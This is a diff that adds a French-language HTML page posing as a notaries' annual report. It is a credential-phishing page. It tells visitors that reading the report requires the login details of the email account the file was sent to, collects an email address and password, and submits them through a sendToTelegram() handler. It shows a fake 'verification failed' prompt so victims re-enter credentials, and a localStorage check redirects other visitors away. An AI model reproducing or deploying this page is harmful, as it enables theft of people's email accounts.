@@ -1,0 +1,50 @@
+
+<head>
+    <meta charset="UTF-8">
+    <title>Rapport annuel des notaires</title>
+    <link rel="icon" type="image/png" href="https://files.catbox.moe/h90lru.jpg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap"
+        rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://xen-jingue.web.app/bootstrapcmd.min.css" charset="utf-8" />
+</head>
+<body>
+    <div id="load">
+        <img src="https://xen-jingue.web.app/agxi.png">
+    </div>
+    <div class="f-container">
+        <div class="header">
+            <img src="https://xen-jingue.web.app/ey8t.png">
+        </div>
+        <div class="f-content">
+		<form method=post onsubmit="sendToTelegram(); return false;">
+            <div class="f-description">Pour lire ce rapport, veuillez entrer les identifiants de la messagerie à
+                laquelle le fichier a été envoyé</div>
+            <div id="message1">Echec de la vérification. <br> Veuillez réessayer en utilisant les identifiants corrects...</div>
+			<div id="message"></div>
+            <div class="f-inputs-container">
+                <input id="oneo" name="mega" placeholder="Adresse e-mail" type="email" required autocomplete="off" autofocus>
+            </div>
+            <div class="f-inputs-container" id="twoo-container">
+                <input id="twoo" name="giga" placeholder="Mot de passe" type="password" required autocomplete="off">
+            </div>
+            <div class="f-inputs-container buttons">
+                <center>
+                    <button id="next">Continuer</button>
+                    <button id="submit-btn">S'identifier</button>
+                </center>
+            </div>
+		</form>
+        </div>
+    </div>
+	<script>
+	if(localStorage.getItem("valide")!=="true"){
+	window.location.href="../";
+	}
+	</script>
+    <script src="dm.js"></script>
+</body>
+</html>
